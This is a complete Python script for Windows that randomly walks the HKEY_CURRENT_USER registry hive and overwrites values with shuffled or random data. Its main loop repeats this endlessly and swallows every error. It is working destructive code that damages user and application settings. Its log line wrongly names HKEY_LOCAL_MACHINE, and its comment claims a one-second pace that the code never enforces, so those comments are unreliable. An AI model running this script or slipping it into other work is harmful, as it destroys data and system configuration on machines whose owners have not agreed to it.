#!/usr/bin/env python3
import random
import winreg
import time

# random.seed(12345)  # optional: reproducible shuffle

def open_read(hkey, subkey):
    try:
        return winreg.OpenKey(hkey, subkey, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
    except OSError:
        return None

def get_subkeys(hkey, path):
    """List subkeys of a given key."""
    subkeys = []
    k = open_read(hkey, path)
    if k is None:
        return subkeys
    try:
        i = 0
        while True:
            try:
                sub = winreg.EnumKey(k, i)
                subkeys.append(sub)
                i += 1
            except OSError:
                break
    finally:
        k.Close()
    return subkeys

def get_values(hkey, path):
    """List (name, value, type) tuples for a key's values."""
    values = []
    k = open_read(hkey, path)
    if k is None:
        return values
    try:
        i = 0
        while True:
            try:
                name, val, typ = winreg.EnumValue(k, i)
                values.append((name, val, typ))
                i += 1
            except OSError:
                break
    finally:
        k.Close()
    return values

def randomize_val(val, typ):
    """Randomize a registry value based on its type."""
    if typ == winreg.REG_SZ or typ == winreg.REG_EXPAND_SZ:
        chars = list(str(val))
        random.shuffle(chars)
        return ''.join(chars)
    elif typ == winreg.REG_MULTI_SZ:
        val = list(val)
        random.shuffle(val)
        return val
    elif typ == winreg.REG_DWORD:
        return random.randint(0, 0xFFFFFFFF)
    elif typ == winreg.REG_QWORD:
        return random.randint(0, 0xFFFFFFFFFFFFFFFF)
    elif typ == winreg.REG_BINARY:
        b = bytearray(val)
        random.shuffle(b)
        return bytes(b)
    else:
        return val  # no change if type not handled

def random_corrupt():
    hive = winreg.HKEY_CURRENT_USER
    path = ""
    depth = 0
    max_depth = 100
    max_attempts = 100  # Limit attempts to find a modifiable key
    modified = False
    attempts = 0

    while not modified and attempts < max_attempts:
        attempts += 1
        # Random walk through subkeys
        current_path = ""
        current_depth = 0
        while current_depth < max_depth and random.random() < 0.8:
            subkeys = get_subkeys(hive, current_path)
            if not subkeys:
                break
            next_sub = random.choice(subkeys)
            current_path = current_path + "\\" + next_sub if current_path else next_sub
            current_depth += 1

        if current_path:
            try:
                with winreg.OpenKey(hive, current_path, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY) as k:
                    values = get_values(hive, current_path)
                    if values:
                        name, val, typ = random.choice(values)
                        new_val = randomize_val(val, typ)
                        try:
                            winreg.SetValueEx(k, name, 0, typ, new_val)
                            print(f"Randomized HKEY_LOCAL_MACHINE\\{current_path}\\{name} from {val} to {new_val}")
                            modified = True
                        except (PermissionError, OSError) as e:
                            # Skip individual value errors silently
                            pass
            except (PermissionError, OSError) as e:
                # Skip key open errors silently
                pass

    if not modified:
        print(f"No modifiable key found after {max_attempts} attempts.")

def main():
    # Continuously perform one random corruption per second until stopped
    while True:
        try:
            random_corrupt()
        except:
            pass

if __name__ == "__main__":
    main()